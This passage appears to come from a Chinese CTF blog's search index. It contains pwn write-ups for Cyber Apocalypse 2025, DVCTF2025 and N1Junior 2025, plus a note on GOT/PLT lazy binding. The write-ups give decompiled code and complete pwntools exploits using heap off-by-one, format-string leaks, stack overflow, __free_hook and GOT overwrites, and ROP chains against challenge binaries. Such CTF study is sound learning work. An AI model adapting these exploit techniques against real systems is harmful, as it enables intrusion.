\"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#edit-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#delete-plan"},{"categories":["WP"],"collections":null,"content":"思路\r覆盖free_hook(发现覆盖malloc_hook为one_gadget都不行) 泄露libc。 先申请一个大于tcache范围的块，再申请一个块，防止前一个chunk与topchunk合并 然后free掉第一个chunk， 再重新申请出来，并把用户区里的libc地址edit出来，计算libc地址。 覆盖free_hook 利用off-by-one改大其中一个块，再申请出来，覆盖掉下一个chunk的内容 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-2"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './strategist' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) one_gadget = [0x10a41c,0x4f3ce,0x4f3d5,0x4f432] def create(long,plan): p.sendlineafter(b'\u003e ',b'1') p.sendlineafter(b'\u003e ',str(long)) p.sendafter(b'\u003e ',plan) def show(number): p.sendlineafter(b'\u003e ',b'2') p.sendlineafter(b'\u003e ',str(number)) def edit(number,plan): p.sendlineafter(b'\u003e ',b'3') p.sendlineafter(b'\u003e ',str(number)) p.sendafter(b'\u003e ',plan) def delete(number): p.sendlineafter(b'\u003e ',b'4') p.sendlineafter(b'\u003e ',str(number)) pl = b'aaaa' create(0x500,pl) create(0x100,pl) delete(0) delete(1) create(0x500,b'a') show(0) # leak libc base addr p.recvuntil(b'Plan [0]: a') libc_addr = u64(p.recv(5).rjust(8,b'\\x00')) libc_addr = libc_addr \u003e\u003e 16 libc_base_addr = libc_addr-0x733efa3ebc00+0x733efa000000 success(\"libc_base_addr ----\u003e 0x%x\",libc_base_addr) libc.address = libc_base_addr delete(0) malloc_hook_addr = libc_base_addr + 0x3EBC30 one_gadget_addr = one_gadget[0] + libc_base_addr create(0x48,b'a'*0x48) create(0x48,b'b'*0x48) create(0x48,b'c'*0x48) edit(0,b'w'*0x48+p8(0x80)) delete(1) delete(2) create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook)) create(0x40, b'/bin/sh\\x00') create(0x40, p64(libc.sym.system)) delete(2) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:3","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-4"},{"categories":["WP"],"collections":null,"content":"格式化字符串漏洞+栈溢出 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#"},{"categories":["WP"],"collections":null,"content":"DVCTF\rArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#dvctf"},{"categories":["WP"],"collections":null,"content":"逆向分析\rint __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-44h] BYREF char v5[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+48h] [rbp-8h] v6 = __readfsqword(0x28u); puts(asc_2190); puts(\u0026byte_2228); puts(\u0026byte_22C0); puts(\u0026byte_2358); puts(\u0026byte_23F0); puts(\u0026byte_2488); puts(\u0026byte_2520); puts(\u0026byte_25B8); puts(\u0026byte_2650); puts(\u0026byte_26E8); puts(\u0026byte_2780); puts(\u0026byte_2818); puts(\u0026byte_28B0); puts(\u0026byte_2948); puts(\u0026byte_29E0); puts(\u0026byte_2A78); puts(\u0026byte_2B10); puts(\u0026byte_2BA8); puts(\u0026byte_2C40); puts(\u0026byte_2CD8); puts(\u0026byte_2D70); puts(\u0026byte_2E08); puts(\u0026byte_2EA0); puts(\u0026byte_2F38); puts(\u0026byte_2FD0); puts(\u0026byte_3068); puts(\u0026byte_3100); puts(\u0026byte_3198); puts(\u0026byte_3230); puts(\u0026byte_32C8); puts(\"Enter your name : \"); __isoc99_scanf(\" %[^\\n]\", v5); printf(\"\\n Hey %s \", v5); puts(\" ! Welcome to the Louvre software !\"); do { displayMenu(); __isoc99_scanf(\"%d\", \u0026v4); if ( v4 == 4 ) { QuitProgram(v5); } else { if ( v4 \u003c= 4 ) { switch ( v4 ) { case 3: VisitRoom(); continue; case 1: CheckIdentity(v5); continue; case 2: CheckVersion(); continue; } } puts(\"\\n Invalid choice. \"); } } while ( v4 != 4 ); return 0; } CheckIdentity中存在格式化字符串漏洞 int __fastcall CheckIdentity(const char *a1) { puts(\"Your identity is : \"); return printf(a1); } VisitRoom中存在栈溢出漏洞 __int64 VisitRoom() { unsigned int v1; // [rsp+8h] [rbp-18h] BYREF char v2[10]; // [rsp+Eh] [rbp-12h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"How many rooms do you want to visit? ( 0-99 )\"); __isoc99_scanf(\"%2d\", \u0026v1); if ( v1 \u003c= 0x1388 ) { printf(\"\\nYou have chosen to request a visit %d rooms.\\n\", v1); } else { puts(\"That's a lot, isn't it?!\"); puts(\"Who are the tickets for?\"); __isoc99_scanf(\"%s\", v2); printf(\"Tickets will be sent to: %s\\n\", v2); } return 0; } 存在输出flag的函数 void readflag() { char v0; // [rsp+7h] [rbp-9h] FILE *stream; // [rsp+8h] [rbp-8h] stream = fopen(\"flag.txt\", \"r\"); if ( stream ) { while ( 1 ) { v0 = fgetc(stream); if ( v0 == -1 ) break; putchar(v0); } fclose(stream); } else { perror(\"Failed to open file\"); } } ","date":"2025-05-26","objectID":"/posts/dvctf2025/:1:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#逆向分析"},{"categories":["WP"],"collections":null,"content":"思路\r通过格式化字符串漏洞，泄露栈上的canary和程序基地址。通过栈溢出，修改返回地址 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:2:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#思路"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x1296 p.recvuntil(b'name : \\n') pl = b'%19$p|%9$p' p.sendline(pl) # dbg() p.sendline(b'1') p.recvuntil(b'identity is : \\n') canary = int(p.recv(18),16) success(\"canary ---\u003e 0x%x\",canary) p.recvuntil(b'|') base_addr = int(p.recv(14),16) base_addr = base_addr - 0x5619fcb116fb + 0x5619fcb10000 success(\"base_addr ---\u003e 0x%x\",base_addr) p.sendline(b'3') p.sendline(b'-1') p.recvuntil(b'for?\\n') pl = b'a'*10 + p64(canary) pl+= p64(0) + p64(base_addr + backdoor) p.sendline(pl) p.interactive() ","date":"2025-05-26","objectID":"/posts/dvctf2025/:3:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#exp"},{"categories":["WP"],"collections":null,"content":"知识点\rscanf(\"%s\") 的行为： %s 会读取输入直到遇到 空白字符（空格、换行、制表符等），不会因 \\x00 终止。 输入数据中的 \\x00 会被视为普通字符，继续写入内存。 （。。。当时打的时候还以为canary的\\x00会截断scanf的%s） ","date":"2025-05-26","objectID":"/posts/dvctf2025/:4:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#知识点"},{"categories":["pwn"],"collections":null,"content":"延迟绑定过程分析 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#"},{"categories":["pwn"],"collections":null,"content":"GOT\u0026PLT\rgot表和plt表都是程序调用外部函数时，定位该函数需要使用到的表 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt"},{"categories":["pwn"],"collections":null,"content":"Global Offset Table(GOT，全局偏移表)\rGOT 表的主要功能是 存储动态链接库（如 libc.so）中函数和全局变量的运行时地址。 GOT表包括两种类型.got和.got.plt .got 存储 全局变量 的地址 .got.plt 存储 动态库函数 的地址（如 printf、read）。 与 PLT（Procedure Linkage Table） 配合实现 延迟绑定（Lazy Binding）。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#global-offset-tablegot全局偏移表"},{"categories":["pwn"],"collections":null,"content":".got.plt的公共表项\r有三个公共表项，分别是 got[0]:_DYNAMIC:指向 动态段（.dynamic） 的地址 got[1]:link_map 指针:动态链接器内部使用的 link_map 结构指针（用于符号解析） got[2]:_dl_runtime_resolve:动态解析函数的地址 got[3]开始就是函数的地址 示例：x86-64 的 .got.plt 布局 .got.plt:0000000000403FE8 .got.plt:0000000000403FE8 ; Segment type: Pure data .got.plt:0000000000403FE8 ; Segment permissions: Read/Write .got.plt:0000000000403FE8 _got_plt segment qword public 'DATA' use64 .got.plt:0000000000403FE8 assume cs:_got_plt .got.plt:0000000000403FE8 ;org 403FE8h .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r .got.plt:0000000000404000 off_404000 dq offset seccomp_init ; DATA XREF: _seccomp_init+4↑r .got.plt:0000000000404008 off_404008 dq offset seccomp_rule_add .got.plt:0000000000404008 ; DATA XREF: _seccomp_rule_add+4↑r .got.plt:0000000000404010 off_404010 dq offset write ; DATA XREF: _write+4↑r .got.plt:0000000000404018 off_404018 dq offset seccomp_load ; DATA XREF: _seccomp_load+4↑r .got.plt:0000000000404020 off_404020 dq offset setbuf ; DATA XREF: _setbuf+4↑r .got.plt:0000000000404028 off_404028 dq offset close ; DATA XREF: _close+4↑r .got.plt:0000000000404030 off_404030 dq offset read ; DATA XREF: _read+4↑r .got.plt:0000000000404030 _got_plt ends .got.plt:0000000000404030 其中 .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r 就是公共表项，从上到下依次就是got[0]、got[1]、got[2] got[1]、got[2]由动态链接器在装载共享模块的时候负责将它们初始化 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:1","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt的公共表项"},{"categories":["pwn"],"collections":null,"content":"link_map\r数据结构的定义如下： struct link_map { /* Shared library's load address. */ ElfW(Addr) l_addr; /* Pointer to library's name in the string table. */ char *l_name; /* Dynamic section of the shared object. Includes dynamic linking info etc. Not interesting to us. */ ElfW(Dyn) *l_ld; /* Pointer to previous and next link_map node. */ struct link_map *l_next, *l_prev; }; 首次调用动态函数时，_dl_runtime_resolve 通过 link_map 解析符号地址。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:2","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#link_map"},{"categories":["pwn"],"collections":null,"content":"Procedure Linkage Table(PLT,进程链接表)\r结构： PLT0（公共解析逻辑） 所有 PLT 条目共享的代码，负责调用 _dl_runtime_resolve 解析函数地址。 PLT1, PLT2, …（函数专用条目） 每个动态函数（如 printf、read）有一个 PLT 条目。 典型 PLT 条目（x86-64） printf@plt: jmp *GOT[n] ; 首次调用时，GOT[n] 指向下一行（解析逻辑） push 5 ; 符号索引（5 = printf 在 .dynsym 中的下标） jmp PLT0 ; 跳转到公共解析逻辑（_dl_runtime_resolve） ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#procedure-linkage-tableplt进程链接表"},{"categories":["pwn"],"collections":null,"content":"延迟绑定过程\r函数第一次调用时，过程如下图： 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口，但是这个时候got表中还没有填充函数的真实地址。 所以从got表跳回到plt表中，继续往下执行push;jmp。跳回后，push的值是对应函数在**.got.plt**入口的偏移 跳到PLT头部，执行push指令，将 GOT[1] 的地址（link_map的地址）入栈。 接着jmp到 **GOT[2] ** 即dl_runtime_resolve相关的函数对动态函数进行地址解析和重定位 并且把函数真实地址回填到got表中 最后执行函数 非首次调用，过程如下图： 之后再调用该函数的时候，plt只有一个跳转指令，找到对应的函数地址之后执行函数。动态调试看了一个整个运行过程，有了一个更深入的的理解。 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口 此时的got表被填充为函数的真实地址，跳转到真实地址 执行函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#延迟绑定过程"},{"categories":["pwn"],"collections":null,"content":"实际分析\r这里用gdb动态调试，实际分析一下 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#实际分析"},{"categories":["pwn"],"collections":null,"content":"第一次调用过程：\r首先函数call了0x401100，0x401100就是read函数的.plt.sec 接着step步入 可以看到，实际上，程序会先进入.plt.sec执行jmp，再到.plt中执行push;jmp。 可以看到这时read函数的.got.plt还没被更改为真实地址，而是指向read函数PLT表项中的push 执行完dl_runtime_resolve相关的函数，就会进入read的真实地址执行read，同时可以看到，read函数的.got.plt也指向的该函数真实地址 接着就执行read函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#第一次调用过程"},{"categories":["pwn"],"collections":null,"content":"非首次调用过程：\r先call了read函数的.plt.sec 然后s步入 qword ptr [rip + 0x2f26]就是取出存储在read的.got.plt中地址，然后跳转到该地址 指令 行为 jmp 0x404040 直接跳转到 0x404040（绝对地址） jmp [0x403f2c] 从 0x403f2c 读取 8 字节作为目标地址 jmp qword ptr [rip + 0x2f26] 从 (RIP + 0x2f26) 读取 8 字节作为目标地址（动态计算） 然后直接执行read 所以，非首次调用，got表中存储的就是真实地址 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#非首次调用过程"},{"categories":["pwn"],"collections":null,"content":"参考文献\r延迟绑定过程分析：理论分析 深入理解plt表、got表和动态链接：前置知识 延迟绑定过程图 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#参考文献"},{"categories":["WP"],"collections":null,"content":"N1Junior_2025 Pwn复现 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:0:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#"},{"categories":["WP"],"collections":null,"content":"Remake\r涉及知识点：.fini_array Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_11A9(); read(0, format, 0x10u); printf(format); if ( dword_4060 ) //刚开始 dword_4060 = 0 sub_120E(); else dword_4060 = 1; return 0; } unsigned __int64 sub_120E() { char buf[16]; // [rsp+0h] [rbp-1010h] BYREF unsigned __int64 v2; // [rsp+1008h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0x300u); printf(buf); return v2 - __readfsqword(0x28u); } 看到程序，很容易联想到修改.fini_array来重新执行main函数（这样dword_4060就会等于1，进入sub_120E函数） 接下来就是利用格式化字符串漏洞printf(format);，来修改.fini_array .fini_array下面就是main函数的地址(出题人的gift) 程序开了PIE，程序基地址+0x3da0为.fini_array地址，我们可以通过程序基地址+8+0x3da0这样就能修改程序返回地址为main函数地址 printf是栈中指向程序基地址的地址位于动态连接器，可能为struct link_map中的l_addr(程序基地址) 因为.fini_array 的实际地址 = l_addr + .fini_array 的偏移地址 所以这里我们让l_addr+8 同时，通过栈中main函数的地址减去偏移，就能得到PIE基地址 这时exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) # elf = ELF(address) # libc = ELF.libc # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) 发送payload之后，再dbg，在重新执行时，查看printf时的栈情况 再在栈中寻找stack地址和libc地址，再通过覆盖返回地址为one_gadget，实现getshell 最终exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) elf = ELF(address) libc = ELF(\"./libc.so.6\") # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) pl = b\"%12$p%26$p\" #stack libc # dbg() sl(pl) # ru(b\"0x\") ru(b\"0x\") stack = int(r(12),16) - 0x40 ru(b\"0x\") libc_addr = int(r(12),16) - 0x216600 success(\"stack=0x%x\",stack) success(\"libc_base=0x%x\",libc_addr) stack_ret_addr = stack + 8 pop_rdi_ret = libc_addr + 0x2a3e5 binsh_addr = libc_addr + next(libc.search(b\"/bin/sh\")) system_addr = libc_addr + libc.sym[\"system\"] one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43] one_addr = libc_addr + one[4] payload2 = fmtstr_payload(6,{stack_ret_addr:one_addr}) # dbg() s(payload2) itr() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:1:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#remake"},{"categories":["WP"],"collections":null,"content":"write_at_will\rArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#write_at_will"},{"categories":["WP"],"collections":null,"content":"逆向分析\r程序开了沙箱 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 只允许了exit、read、write、openat、close 要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:1","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析"},{"categories":["WP"],"collections":null,"content":"思路\r程序中没留后门函数，需要libc，先泄露libc 改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP 写openat+read+write的ROP链 在call __stack_chk_fail的时候会push下一条指令的地址 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) exit_got = elf.got['exit'] def arb_write(address,content): p.sendlineafter(b'. Exit\\n',b'1') p.sendafter(b'get?',str(address).encode()) p.send(p32(content)) #泄露libc p.sendlineafter(b'3. Exit\\n',b'2') p.sendafter(b'get?',str(0x404038).encode()) p.recvuntil(b'\\x0a') libc_base = u64(p.recv(6)[-7:].ljust(8,b'\\x00')) - 0x7330237b97d0 + 0x7330236a5000 success(\"libc ---\u003e 0x%x\",libc) gets_addr = libc_base + libc.symbols['gets'] #改printf为gets arb_write(0x404030,gets_addr\u00260xffffffff) #改exit_got arb_write(exit_got,0x40165a) #改stack chk fail 为 ret指令 arb_write(0x404028,0x40101a) openat = libc_base + libc.symbols['openat'] read = libc_base + libc.symbols['read'] write = libc_base + libc.symbols['write'] exit_addr = libc_base + libc.symbols['exit'] pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_rcx_rbx_ret = libc_base + 0x0000000000108b03 ret = 0x40101a pl = b'a'*0xa + p64(ret)*8 pl += p64(pop_rdi_ret) + p64(0x404200) + p64(gets_addr) pl += p64(pop_rdi_ret) + p64(0xffffff9c) + p64(pop_rsi_ret) + p64(0x404200) +p64(pop_rdx_rcx_rbx_ret) + p64(0)*3 + p64(openat) pl += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404300) + p64(pop_rdx_rcx_rbx_ret) + p64(0x100)*3 + p64(read) pl += p64(pop_rdi_ret) + p64(1) + p64(write) # dbg() p.sendline(pl) p.sendline(b'/flag\\x00') p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:2","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#思路"},{"categories":["WP"],"collections":null,"content":"oldwine\r","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:0","tags":null,"title":"N1Junior_2025 